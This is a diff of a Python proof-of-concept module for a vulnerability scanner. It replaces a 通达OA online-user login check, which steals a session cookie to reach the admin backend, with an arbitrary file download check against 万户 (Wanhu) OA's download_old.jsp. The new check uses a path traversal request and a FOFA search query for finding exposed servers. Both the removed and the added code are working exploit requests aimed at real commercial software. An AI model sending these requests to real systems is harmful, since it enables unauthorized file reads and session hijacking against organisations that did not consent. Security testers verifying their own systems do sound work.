+++ poc/whir_万户软件/FileDownload_download_old_jsp/poc.py
@@ -14,23 +14,21 @@ class POC(POCBase):
         "CreateDate" : "2022-01-01",        # POC创建时间
         "UpdateDate" : "2022-01-01",        # POC创建时间
         "PocDesc" : """
-            略
+        略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "通达OA < v11.7 auth_mobi.php 在线用户登录漏洞",                        # 漏洞名称
+        "name" : "万户OA download_old.jsp 任意文件下载漏洞",                        # 漏洞名称
         "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "通达OA",                     # 漏洞应用名称
-        "AppVersion" : "通达OA < 11.7",                  # 漏洞应用版本
+        "AppName" : "万户OA",                     # 漏洞应用名称
+        "AppVersion" : "",                  # 漏洞应用版本
         "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            通达OA（OfficeAnywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，
-            是与中国企业管理实践相结合形成的综合管理办公平台。
-            
-            通达存在任意用户登录漏洞，攻击者可以通过指定接口查询在线用户并获取cookie，导致业务后台失陷。
+            万户软件网络是业内普遍认可的智慧政务办公专家,OA系统国家行业标准编制组长单位,协同软件国家行业标准编制组长单位,22年专注协同管理领域.为您提供定制化的智慧政务一体化办公解决方案。
+            万户OA download_old.jsp处存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件，导致服务器失陷。
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="TDXK-通达OA"
+            app="万户网络-ezOFFICE"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -45,8 +43,8 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url0 = self.target + "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0" # url自己按需调整
-        url1 = self.target + "/general/"
+        url = self.target + "/defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp" # url自己按需调整
+        
 
         headers = {
                     "User-Agent":get_random_ua(),
@@ -58,15 +56,11 @@ class POC(POCBase):
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
-            if req0.status_code == 200 and "PHPSESSID" in req0.headers["Set-Cookie"] and len(req0.text.strip()) == 0:
-                cookie = req0.headers["Set-Cookie"].split(";")[0].strip()
-                headers["Cookie"] = cookie
-                req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
-                if req1.status_code == 200 and "<!--[if IE 6 ]> <html class=\"ie6 lte_ie6 lte_ie7 lte_ie8 lte_ie9\"> <![endif]-->" in req1.text:
-                    vuln = [True,"<title> Url: %s | Cookie: %s </title>" % (url1,cookie)]
+            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+            if "//com.whir.quarkmail.EditUser editUser=com.whir.quarkmail.EditUser.getInstance();" in req.text and req.status_code == 200 and "application/x-msdownload" in req.headers["Content-Type"]:
+                vuln = [True,req.text]
             else:
-                vuln = [False,req0.text]
+                vuln = [False,req.text]
         except Exception as e:
             raise e